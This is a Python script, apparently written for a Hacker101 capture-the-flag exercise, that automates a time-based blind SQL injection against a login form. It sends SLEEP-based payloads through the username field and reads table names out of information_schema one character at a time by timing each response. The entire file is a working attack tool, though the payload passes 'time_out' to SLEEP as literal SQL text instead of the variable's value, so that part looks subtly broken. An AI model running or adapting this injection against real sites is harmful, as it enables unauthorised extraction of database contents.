import requests
import time

url = 'https://c349d399b6b4354b6df1256adc35e47a.ctf.hacker101.com/login'

cookies = {
    "_ga_W62NXF3JMB": "GS2.1.s1748854158$o2$g0$t1748854158$j60$l0$h0",
    "_ga_K45575FWB8": "GS2.1.s1748854158$o2$g0$t1748854158$j60$l0$h0",
    "_ga": "GA1.1.659219844.1744388181"
}

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": url
}

extracted = ''
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%&*()'
session = requests.Session()
session.cookies.update(cookies)

feature = 'table'
database = 'level2'
time_out = 10
raw = 2

# Extrair username
for i in range(1, 100):  # Ajuste para tamanho máximo esperado
    for c in charset:
        print(f"[Testando posição {i} → caractere '{c}']", end=' ... \r')
        payload = f"' OR (SELECT CASE WHEN SUBSTRING((SELECT {feature}_name FROM information_schema.{feature}s WHERE table_schema='{database}' LIMIT {raw},1), {i}, 1) = '{c}' THEN SLEEP(time_out) ELSE 0 END) -- -"
        data = {"username": payload, "password": "test"}
        start = time.time()
        session.post(url, data=data, headers=headers)
        delta = time.time() - start
        if delta > (time_out - 1):
            extracted += c
            print(f"[+] Found char {i}: {c}")
            break
    else:
        print(f"[!] End of first table at position {i}")
        break

print(f"first table: {extracted} | Length: {len(extracted)}")

